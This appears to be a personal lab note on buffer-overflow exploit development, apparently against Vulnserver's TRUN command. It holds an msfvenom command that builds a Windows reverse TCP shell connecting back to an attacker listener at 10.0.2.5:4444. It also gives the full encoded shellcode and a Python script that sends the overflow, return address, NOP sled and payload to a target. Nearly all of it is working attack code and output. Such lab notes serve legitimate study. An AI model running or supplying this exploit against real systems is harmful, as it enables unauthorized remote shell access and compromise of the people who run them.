Generating shellcode and gaining root access

Friday, June 23, 2023

10:05 PM

Msfvenom payload with the null byte we found as badchar

 

msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.5 LPORT=4444 EXITFUNC=thread -f c -a x86 -b \"\\x00\"

 

 

Found 12 compatible encoders

Attempting to encode payload with 1 iterations of x86/shikata_ga_nai

x86/shikata_ga_nai succeeded with size 351 (iteration=0)

x86/shikata_ga_nai chosen with final size 351

Payload size: 351 bytes

Final size of c file: 1506 bytes

unsigned char buf\[\] =

\"\\xdd\\xc2\\xb8\\x3d\\x84\\x29\\xae\\xd9\\x74\\x24\\xf4\\x5f\\x29\\xc9\"

\"\\xb1\\x52\\x31\\x47\\x17\\x83\\xef\\xfc\\x03\\x7a\\x97\\xcb\\x5b\\x78\"

\"\\x7f\\x89\\xa4\\x80\\x80\\xee\\x2d\\x65\\xb1\\x2e\\x49\\xee\\xe2\\x9e\"

\"\\x19\\xa2\\x0e\\x54\\x4f\\x56\\x84\\x18\\x58\\x59\\x2d\\x96\\xbe\\x54\"

\"\\xae\\x8b\\x83\\xf7\\x2c\\xd6\\xd7\\xd7\\x0d\\x19\\x2a\\x16\\x49\\x44\"

\"\\xc7\\x4a\\x02\\x02\\x7a\\x7a\\x27\\x5e\\x47\\xf1\\x7b\\x4e\\xcf\\xe6\"

\"\\xcc\\x71\\xfe\\xb9\\x47\\x28\\x20\\x38\\x8b\\x40\\x69\\x22\\xc8\\x6d\"

\"\\x23\\xd9\\x3a\\x19\\xb2\\x0b\\x73\\xe2\\x19\\x72\\xbb\\x11\\x63\\xb3\"

\"\\x7c\\xca\\x16\\xcd\\x7e\\x77\\x21\\x0a\\xfc\\xa3\\xa4\\x88\\xa6\\x20\"

\"\\x1e\\x74\\x56\\xe4\\xf9\\xff\\x54\\x41\\x8d\\xa7\\x78\\x54\\x42\\xdc\"

\"\\x85\\xdd\\x65\\x32\\x0c\\xa5\\x41\\x96\\x54\\x7d\\xeb\\x8f\\x30\\xd0\"

\"\\x14\\xcf\\x9a\\x8d\\xb0\\x84\\x37\\xd9\\xc8\\xc7\\x5f\\x2e\\xe1\\xf7\"

\"\\x9f\\x38\\x72\\x84\\xad\\xe7\\x28\\x02\\x9e\\x60\\xf7\\xd5\\xe1\\x5a\"

\"\\x4f\\x49\\x1c\\x65\\xb0\\x40\\xdb\\x31\\xe0\\xfa\\xca\\x39\\x6b\\xfa\"

\"\\xf3\\xef\\x3c\\xaa\\x5b\\x40\\xfd\\x1a\\x1c\\x30\\x95\\x70\\x93\\x6f\"

\"\\x85\\x7b\\x79\\x18\\x2c\\x86\\xea\\x2d\\xb1\\x8a\\xef\\x59\\xb3\\x8a\"

\"\\xfe\\xc5\\x3a\\x6c\\x6a\\xe6\\x6a\\x27\\x03\\x9f\\x36\\xb3\\xb2\\x60\"

\"\\xed\\xbe\\xf5\\xeb\\x02\\x3f\\xbb\\x1b\\x6e\\x53\\x2c\\xec\\x25\\x09\"

\"\\xfb\\xf3\\x93\\x25\\x67\\x61\\x78\\xb5\\xee\\x9a\\xd7\\xe2\\xa7\\x6d\"

\"\\x2e\\x66\\x5a\\xd7\\x98\\x94\\xa7\\x81\\xe3\\x1c\\x7c\\x72\\xed\\x9d\"

\"\\xf1\\xce\\xc9\\x8d\\xcf\\xcf\\x55\\xf9\\x9f\\x99\\x03\\x57\\x66\\x70\"

\"\\xe2\\x01\\x30\\x2f\\xac\\xc5\\xc5\\x03\\x6f\\x93\\xc9\\x49\\x19\\x7b\"

\"\\x7b\\x24\\x5c\\x84\\xb4\\xa0\\x68\\xfd\\xa8\\x50\\x96\\xd4\\x68\\x70\"

\"\\x75\\xfc\\x84\\x19\\x20\\x95\\x24\\x44\\xd3\\x40\\x6a\\x71\\x50\\x60\"

\"\\x13\\x86\\x48\\x01\\x16\\xc2\\xce\\xfa\\x6a\\x5b\\xbb\\xfc\\xd9\\x5c\"

\"\\xee\";

 

-   Payload size is important

 

New python payload with (no operation) nop before overflow for padding. May have to play around with amount of padding for exploit development.

 

#!/usr/bin/python

import sys, socket

 

overflow = (\"\\xdd\\xc2\\xb8\\x3d\\x84\\x29\\xae\\xd9\\x74\\x24\\xf4\\x5f\\x29\\xc9\"

\"\\xb1\\x52\\x31\\x47\\x17\\x83\\xef\\xfc\\x03\\x7a\\x97\\xcb\\x5b\\x78\"

\"\\x7f\\x89\\xa4\\x80\\x80\\xee\\x2d\\x65\\xb1\\x2e\\x49\\xee\\xe2\\x9e\"

\"\\x19\\xa2\\x0e\\x54\\x4f\\x56\\x84\\x18\\x58\\x59\\x2d\\x96\\xbe\\x54\"

\"\\xae\\x8b\\x83\\xf7\\x2c\\xd6\\xd7\\xd7\\x0d\\x19\\x2a\\x16\\x49\\x44\"

\"\\xc7\\x4a\\x02\\x02\\x7a\\x7a\\x27\\x5e\\x47\\xf1\\x7b\\x4e\\xcf\\xe6\"

\"\\xcc\\x71\\xfe\\xb9\\x47\\x28\\x20\\x38\\x8b\\x40\\x69\\x22\\xc8\\x6d\"

\"\\x23\\xd9\\x3a\\x19\\xb2\\x0b\\x73\\xe2\\x19\\x72\\xbb\\x11\\x63\\xb3\"

\"\\x7c\\xca\\x16\\xcd\\x7e\\x77\\x21\\x0a\\xfc\\xa3\\xa4\\x88\\xa6\\x20\"

\"\\x1e\\x74\\x56\\xe4\\xf9\\xff\\x54\\x41\\x8d\\xa7\\x78\\x54\\x42\\xdc\"

\"\\x85\\xdd\\x65\\x32\\x0c\\xa5\\x41\\x96\\x54\\x7d\\xeb\\x8f\\x30\\xd0\"

\"\\x14\\xcf\\x9a\\x8d\\xb0\\x84\\x37\\xd9\\xc8\\xc7\\x5f\\x2e\\xe1\\xf7\"

\"\\x9f\\x38\\x72\\x84\\xad\\xe7\\x28\\x02\\x9e\\x60\\xf7\\xd5\\xe1\\x5a\"

\"\\x4f\\x49\\x1c\\x65\\xb0\\x40\\xdb\\x31\\xe0\\xfa\\xca\\x39\\x6b\\xfa\"

\"\\xf3\\xef\\x3c\\xaa\\x5b\\x40\\xfd\\x1a\\x1c\\x30\\x95\\x70\\x93\\x6f\"

\"\\x85\\x7b\\x79\\x18\\x2c\\x86\\xea\\x2d\\xb1\\x8a\\xef\\x59\\xb3\\x8a\"

\"\\xfe\\xc5\\x3a\\x6c\\x6a\\xe6\\x6a\\x27\\x03\\x9f\\x36\\xb3\\xb2\\x60\"

\"\\xed\\xbe\\xf5\\xeb\\x02\\x3f\\xbb\\x1b\\x6e\\x53\\x2c\\xec\\x25\\x09\"

\"\\xfb\\xf3\\x93\\x25\\x67\\x61\\x78\\xb5\\xee\\x9a\\xd7\\xe2\\xa7\\x6d\"

\"\\x2e\\x66\\x5a\\xd7\\x98\\x94\\xa7\\x81\\xe3\\x1c\\x7c\\x72\\xed\\x9d\"

\"\\xf1\\xce\\xc9\\x8d\\xcf\\xcf\\x55\\xf9\\x9f\\x99\\x03\\x57\\x66\\x70\"

\"\\xe2\\x01\\x30\\x2f\\xac\\xc5\\xc5\\x03\\x6f\\x93\\xc9\\x49\\x19\\x7b\"

\"\\x7b\\x24\\x5c\\x84\\xb4\\xa0\\x68\\xfd\\xa8\\x50\\x96\\xd4\\x68\\x70\"

\"\\x75\\xfc\\x84\\x19\\x20\\x95\\x24\\x44\\xd3\\x40\\x6a\\x71\\x50\\x60\"

\"\\x13\\x86\\x48\\x01\\x16\\xc2\\xce\\xfa\\x6a\\x5b\\xbb\\xfc\\xd9\\x5c\"

\"\\xee\")

 

shellcode = \"A\" \* 2003 + \"\\xaf\\x11\\x50\\x62\" + \"\\x90\" \* 32 + overflow

try:

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((\'192.168.1.221\',9999))

s.send((\'TRUN /.:/\' +shellcode))

s.close()

except:

print \"Error connecting to the server\"

sys.exit()

 

 

 
